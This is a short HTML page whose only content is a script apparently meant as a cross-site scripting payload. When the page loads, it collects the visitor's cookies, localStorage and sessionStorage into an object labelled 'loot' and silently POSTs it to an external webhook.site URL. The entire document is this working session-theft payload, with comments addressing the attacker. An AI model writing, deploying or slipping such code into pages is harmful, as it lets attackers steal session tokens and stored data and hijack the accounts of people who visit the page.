<!DOCTYPE html>
<html>
<body>
    <script>
    const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
    
    // 1. Grab everything from Storage
    const loot = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    };

    // 2. Send it to your webhook
    fetch(webhook, {
        method: "POST",
        mode: "no-cors",
        body: "SESSION_LOOT: " + JSON.stringify(loot)
    });
</script>
</body>
</html>
